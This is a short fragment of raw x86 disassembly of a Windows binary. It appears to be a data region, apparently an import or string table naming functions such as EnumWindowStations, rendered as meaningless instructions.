  423aa8:	xor    DWORD PTR [eax],eax
  423aaa:	pop    edi
  423aab:	add    BYTE PTR [esi],dh
  423aad:	add    BYTE PTR [ecx+0x0],bl
  423ab0:	push   ebp
  423ab1:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423ab5:	add    BYTE PTR [edi+0x0],cl
  423ab8:	inc    esp
  423ab9:	add    BYTE PTR [edi+0x0],dl
  423abc:	push   ebx
  423abd:	add    BYTE PTR [eax],al
  423abf:	add    BYTE PTR [edx+0x0],bl
  423ac2:	inc    ebx
  423ac3:	add    BYTE PTR [ebp+0x0],dl
  423ac6:	pop    edi
  423ac7:	add    BYTE PTR [ecx],dh
  423ac9:	add    BYTE PTR [ebp+0x0],al
  423acc:	push   esp
  423acd:	add    BYTE PTR [eax],dh
  423acf:	add    BYTE PTR [eax],al
  423ad1:	add    BYTE PTR [eax],al
  423ad3:	add    BYTE PTR [eax],al
  423ad5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423adb:	inc    edx
  423adc:	add    BYTE PTR [eax],cl
  423ade:	add    BYTE PTR [edx+0x0],0xc
  423ae2:	add    BYTE PTR [edx+0x0],0x10
  423ae6:	add    BYTE PTR [edx+0x0],0x14
  423aea:	add    BYTE PTR [edx+0x0],0x18
  423aee:	add    BYTE PTR [edx+0x0],0x1c
  423af2:	add    BYTE PTR [edx+0x0],0x20
  423af6:	add    BYTE PTR [edx+0x0],0x24
  423afa:	add    BYTE PTR [edx+0x0],0x28
  423afe:	add    BYTE PTR [edx+0x0],0x0
	...
  423b12:	add    BYTE PTR [eax],al
  423b14:	sbb    edi,DWORD PTR [edi+0x4d57]
  423b1a:	add    BYTE PTR [eax],al
  423b1c:	inc    edx
  423b1d:	cmp    eax,DWORD PTR [edx]
  423b1f:	add    BYTE PTR [ecx],al
  423b21:	add    BYTE PTR [eax],al
  423b23:	add    BYTE PTR [ecx],al
  423b25:	add    BYTE PTR [eax],al
  423b27:	add    BYTE PTR [ecx],al
  423b29:	add    BYTE PTR [eax],al
  423b2b:	add    BYTE PTR [eax],bh
  423b2d:	cmp    eax,DWORD PTR [edx]
  423b2f:	add    BYTE PTR [ebx+edi*1],bh
  423b32:	add    al,BYTE PTR [eax]
  423b34:	inc    eax
  423b35:	cmp    eax,DWORD PTR [edx]
  423b37:	add    BYTE PTR [esi-0x31],al
  423b3a:	add    BYTE PTR [eax],al
  423b3c:	dec    esi
  423b3d:	cmp    eax,DWORD PTR [edx]
  423b3f:	add    BYTE PTR [eax],al
  423b41:	add    BYTE PTR [edi+0x6f],dl
  423b44:	jb     0x423baa
  423b46:	push   edi
  423b47:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b4e:	aas    
  423b4f:	inc    ebp
  423b50:	outs   dx,BYTE PTR ds:[esi]
  423b51:	jne    0x423bc0
  423b53:	push   edi
  423b54:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b5b:	popa   
  423b5c:	je     0x423bc7
  423b5e:	outs   dx,DWORD PTR ds:[esi]
  423b5f:	outs   dx,BYTE PTR ds:[esi]
  423b60:	jae    0x423bb5
  423b62:	je     0x423bc5
  423b64:	.byte 0x74
